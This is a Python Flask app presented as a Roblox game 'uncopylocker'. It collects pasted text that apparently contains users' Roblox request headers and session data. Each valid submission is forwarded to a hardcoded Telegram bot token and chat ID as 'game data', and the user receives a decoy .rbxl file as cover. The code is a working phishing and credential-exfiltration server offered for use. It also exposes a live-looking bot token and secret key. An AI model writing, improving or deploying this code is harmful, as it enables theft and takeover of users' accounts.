from flask import Flask, request, render_template, jsonify, send_file, redirect, url_for
import requests, secrets

app = Flask(__name__)

tokens = {}

app.secret_key = "goodboylol67"

BOT_TOKEN = "7724967776:AAGUU3p1WTnyvV2VTRZ56L829nyAG__QDq8"
CHAT_ID = "7715048070"

def send_txt_to_telegram(text_content):
    """
    Send text content as a .txt document to Telegram
    """
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    files = {"document": ("data.txt", text_content, "text/plain")}
    data = {"chat_id": CHAT_ID, "caption": "game data"}
    try:
        response = requests.post(url, data=data, files=files)
        return response.json()
    except Exception as e:
        # print(f"Telegram API Error: {e}")
        return None

def process_input(place_id):
    required_substring = "referer: https://www.roblox.com/"

    if place_id and required_substring in place_id:
        send_txt_to_telegram(place_id)
        # Success response
        
        token = secrets.token_urlsafe(16)
        tokens[token] = True
        file_path = f"/uncopylocked?token={token}"
    
        return {"type": "response", "msg": "Uncopylocked successfully!", "Path": file_path}
    else:
        # Error response
        return {"type": "error", "msg": "XAR invalid or not found."}

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        place_id = request.form.get('place_id', '')
        result = process_input(place_id)
        return jsonify(result)
    
    return render_template('index.html')


@app.route("/uncopylocked")
def uncopylockeds():
    token = request.args.get("token")
    if not token or token not in tokens:
    	return redirect(url_for("index"))
        # abort(403) 
        
    tokens.pop(token)

    return send_file(
        "static/Steal-a-Brainrot.rbxl",
        as_attachment=True,
        download_name="Steal-a-Brainrot.rbxl"
    )
    
if __name__ == '__main__':
    app.run(debug=True, port=5003)